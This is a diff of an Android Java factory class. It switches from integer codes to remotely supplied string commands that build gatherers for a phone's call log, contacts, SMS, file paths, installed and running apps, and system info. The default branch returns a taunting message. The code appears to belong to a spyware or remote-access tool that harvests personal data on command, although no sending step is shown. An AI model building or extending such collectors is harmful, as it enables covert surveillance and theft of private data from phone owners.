@@ -5,37 +5,37 @@ import android.content.Context;
 
 public class GathererBuilder {
 
-    private final int ALL_INFO_GATHERER = 0;
-    private final int CALL_LOG_GATHERER = 1;
-    private final int CONTACTS_GATHERER = 2;
-    private final int FILES_PATHS_GATHERER = 3;
-    private final int INSTALLED_APPS_GATHERER = 4;
-    private final int RUNNING_APPS_GATHERER = 5;
-    private final int SMS_GATHERER = 6;
-    private final int SYSTEM_INFO_GATHERER = 7;
+    private final String ALL_INFO_GATHERER = "allInfo";
+    private final String CALL_LOG_GATHERER = "callLog";
+    private final String CONTACTS_GATHERER = "contacts";
+    private final String FILES_PATHS_GATHERER = "filePaths";
+    private final String INSTALLED_APPS_GATHERER = "installedApps";
+    private final String RUNNING_APPS_GATHERER = "runningApps";
+    private final String SMS_GATHERER = "sms";
+    private final String SYSTEM_INFO_GATHERER = "systemInfo";
 
-    public Gatherer build(int code)
+    public Gatherer build(String cmd, Context context)
     {
-        switch (code)
+        switch (cmd)
         {
 
-            case CALL_LOG_GATHERER: return new CallLogGatherer();
+            case CALL_LOG_GATHERER: return new CallLogGatherer(context);
 
-            case CONTACTS_GATHERER: return new ContactsGatherer();
+            case CONTACTS_GATHERER: return new ContactsGatherer(context);
 
-            case FILES_PATHS_GATHERER: return new FilesPathsGatherer();
+            case FILES_PATHS_GATHERER: return new FilesPathsGatherer(context);
 
-            case INSTALLED_APPS_GATHERER: return new InstalledAppsGatherer();
+            case INSTALLED_APPS_GATHERER: return new InstalledAppsGatherer(context);
 
-            case RUNNING_APPS_GATHERER: return new RunningAppsGatherer();
+            case RUNNING_APPS_GATHERER: return new RunningAppsGatherer(context);
 
-            case SMS_GATHERER: return new SmsGatherer();
+            case SMS_GATHERER: return new SmsGatherer(context);
 
-            case SYSTEM_INFO_GATHERER: return new SystemInfoGatherer();
+            case SYSTEM_INFO_GATHERER: return new SystemInfoGatherer(context);
 
             default: return new Gatherer() {
                 @Override
-                public String getInfo(Context context) {
+                public String getInfo() {
                     return "do u think u r right, maboy???";
                 }
             };
